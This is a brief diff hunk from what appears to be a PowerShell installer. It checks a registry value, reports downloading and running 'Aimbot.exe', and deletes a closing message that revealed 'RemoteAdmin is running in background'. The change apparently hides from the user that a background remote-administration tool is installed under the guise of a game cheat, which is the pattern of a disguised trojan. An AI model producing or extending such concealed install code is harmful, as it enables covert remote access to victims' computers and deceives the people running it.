@@ -48,4 +48,3 @@ if (-not (Get-ItemProperty -Path $RegPath -Name $RegName -ErrorAction SilentlyCo
     Write-Host "Downloaded successfully. Running Aimbot.exe now"
 }
 
-Write-Host "[✔] Installation complete. RemoteAdmin is running in background."
